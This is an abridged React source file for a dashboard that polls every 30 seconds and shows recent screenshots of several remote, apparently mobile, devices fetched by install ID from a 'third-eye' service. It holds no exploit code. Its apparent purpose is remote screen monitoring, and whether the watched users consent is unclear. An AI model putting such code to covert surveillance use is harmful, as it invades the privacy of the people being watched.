...
export default function App() {
  ...
  // Poll every 30s to match your service interval
  ...
  const getActiveDevices = () =>
    visibleDevices.filter(
      d =>
        d.received_at &&
        Date.now() - new Date(d.received_at).getTime() < POLL_INTERVAL_MS * 2
    ).length

  const isDeviceActive = ts =>
    ts && Date.now() - new Date(ts).getTime() < POLL_INTERVAL_MS * 2
    ...
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900">
        ...
        {visibleDevices.map(d => {
          ...
          return (
            ...
            >
              ...
              <div className="aspect-[9/16] bg-gray-900">
                <img
                  src={`https://third-eye-txe8.onrender.com/screenshot/${d.install_uid}`}
                  alt={`${d.device_name} screenshot`}
                  className="w-full h-full object-contain"
                  loading="lazy"
                />
      ...
      <footer className="mt-12 text-center">
        <div className="inline-flex items-center gap-6 px-6 py-3 bg-black/20 backdrop-blur-sm rounded-2xl border border-white/10">
          ...
          <div className="w-px h-4 bg-white/20" />
          <div className="text-sm text-white">
            Auto‑refresh: <span className="text-blue-400 font-bold">{POLL_INTERVAL_MS/1000}s</span>
          </div>
        </div>
      </footer>
    </div>
